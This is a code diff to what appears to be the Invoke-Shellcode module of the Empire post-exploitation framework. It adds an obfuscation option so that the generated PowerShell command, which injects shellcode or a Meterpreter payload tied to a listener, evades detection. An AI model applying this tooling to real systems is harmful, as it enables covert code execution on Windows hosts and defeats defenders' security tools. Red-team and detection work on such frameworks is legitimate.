@@ -88,11 +88,13 @@ class Module:
                 self.options[option]['Value'] = value
 
 
-    def generate(self):
+    def generate(self, obfuscate=False, obfuscationCommand=""):
         
         # read in the common module source code
         moduleSource = self.mainMenu.installPath + "/data/module_source/code_execution/Invoke-Shellcode.ps1"
-
+        if obfuscate:
+            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
+            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
         try:
             f = open(moduleSource, 'r')
         except:
@@ -104,7 +106,7 @@ class Module:
 
         script = moduleCode
 
-        script += "\nInvoke-Shellcode -Force"
+        scriptEnd = "\nInvoke-Shellcode -Force"
 
         listenerName = self.options['Listener']['Value']
         if listenerName != "":
@@ -133,14 +135,16 @@ class Module:
                 if values['Value'] and values['Value'] != '':
                     if option.lower() == "payload":
                         payload = "windows/meterpreter/" + str(values['Value'])
-                        script += " -" + str(option) + " " + payload
+                        scriptEnd += " -" + str(option) + " " + payload
                     elif option.lower() == "shellcode":
                         # transform the shellcode to the correct format
                         sc = ",0".join(values['Value'].split("\\"))[1:]
-                        script += " -" + str(option) + " @(" + sc + ")"
+                        scriptEnd += " -" + str(option) + " @(" + sc + ")"
                     else: 
-                        script += " -" + str(option) + " " + str(values['Value'])
+                        scriptEnd += " -" + str(option) + " " + str(values['Value'])
 
-        script += "; 'Shellcode injected.'"
-
+        scriptEnd += "; 'Shellcode injected.'"
+        if obfuscate:
+            scriptEnd = helpers.obfuscate(psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
+        script += scriptEnd
         return script
